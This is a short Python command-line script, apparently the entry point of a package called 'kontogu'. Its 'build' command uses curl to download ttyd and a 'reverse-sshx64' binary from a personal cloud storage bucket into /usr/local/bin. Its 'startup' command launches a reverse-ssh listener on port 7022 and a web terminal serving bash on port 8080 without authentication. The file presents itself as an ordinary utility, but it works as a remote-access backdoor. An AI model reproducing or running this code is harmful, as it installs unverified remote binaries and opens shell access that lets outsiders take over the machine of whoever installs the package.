
import argparse
import os, sys 

from kontogu import core 


def cmd_test():
    print('here cmd test')
    pass

def cmd_build(args):
    cmd = '''
curl -o /usr/local/bin/ttyd https://github.com/tsl0922/ttyd/releases/download/1.6.1/ttyd_linux.x86_64 
chmod +x /usr/local/bin/ttyd

curl -o /usr/local/bin/reverse-sshx64 https://bucket-2022.s3.us-west-004.backblazeb2.com/linshi/tools/reverse-sshx64  
chmod a+x /usr/local/bin/reverse-sshx64
    '''
    os.system(cmd)
    print('ok , build finish')
    

def cmd_startup(args):
    cmd = '''
reverse-sshx64 -l -v -p 7022 & 
ttyd -p 8080  bash & 
    '''
    os.system(cmd)
    print('ok , startup finish')
    

def execute():
    try:
        args = sys.argv
        if len(args) < 2:
            #_print_commands()
            #check_new_version()
            return

        command = args.pop(1)
        if command == "test":
            cmd_test()
        elif command == "build":
            cmd_build(args)
        elif command == "startup":
            cmd_startup(args)
        else:
            #_print_commands()
            print('command error')
    except KeyboardInterrupt:
        pass

    #check_new_version()


if __name__ == "__main__":
    execute()